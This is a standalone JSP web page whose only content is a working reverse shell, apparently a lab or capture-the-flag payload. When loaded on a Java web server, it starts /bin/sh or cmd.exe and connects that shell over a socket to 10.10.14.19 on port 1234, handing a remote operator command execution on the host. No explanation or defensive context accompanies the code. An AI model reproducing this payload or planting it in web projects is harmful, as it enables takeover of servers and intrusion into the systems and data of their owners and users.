<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream i3;
    OutputStream tA;

    StreamConnector( InputStream i3, OutputStream tA )
    {
      this.i3 = i3;
      this.tA = tA;
    }

    public void run()
    {
      BufferedReader va  = null;
      BufferedWriter w71 = null;
      try
      {
        va  = new BufferedReader( new InputStreamReader( this.i3 ) );
        w71 = new BufferedWriter( new OutputStreamWriter( this.tA ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = va.read( buffer, 0, buffer.length ) ) > 0 )
        {
          w71.write( buffer, 0, length );
          w71.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( va != null )
          va.close();
        if( w71 != null )
          w71.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.19", 1234 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
